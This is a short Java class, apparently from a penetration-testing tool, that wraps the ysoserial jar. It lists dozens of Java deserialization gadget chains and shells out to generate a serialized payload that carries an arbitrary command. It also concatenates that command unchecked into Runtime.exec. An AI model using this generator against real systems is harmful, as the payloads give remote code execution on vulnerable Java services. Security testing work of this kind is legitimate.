package pw.inz.serializationcenter.payloadgenerator;

import org.springframework.aop.scope.ScopedProxyUtils;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Arrays;


public class ysoserialPassThru {

    private static final String[] payloads = new String[]{"Payload", "AspectJWeaver", "BeanShell1", "C3P0", "Click1", "Clojure", "CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3", "CommonsCollections4", "CommonsCollections5", "CommonsCollections6", "CommonsCollections7", "FileUpload1", "Groovy1", "Hibernate1", "Hibernate2", "JBossInterceptors1", "JRMPClient", "JRMPListener", "JSON1", "JavassistWeld1", "Jdk7u21", "Jython1", "MozillaRhino1", "MozillaRhino2", "Myfaces1", "Myfaces2", "ROME", "Spring1", "Spring2", "URLDNS", "Vaadin1", "Wicket1"};//todo from databse

    public static byte[] invoke(String payloadname,String payloadcmd) {
        if(!Arrays.stream(payloads).toList().contains(payloadname)) return null;

        Process proc = null;
        try {
            proc = Runtime.getRuntime().exec("java -jar " + System.getProperty("user.dir") + "/libs/ysoserial-all.jar "+payloadname+" "+payloadcmd);
            proc.waitFor();
            InputStream in = proc.getInputStream();
            byte[] c = new byte[in.available()];
            in.read(c, 0, c.length);

            InputStream err = proc.getErrorStream();
            byte[] a = new byte[err.available()];
            err.read(a, 0, a.length);
            System.out.println(new String(a));
            return c;
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
// Then retreive the process output


    }
}
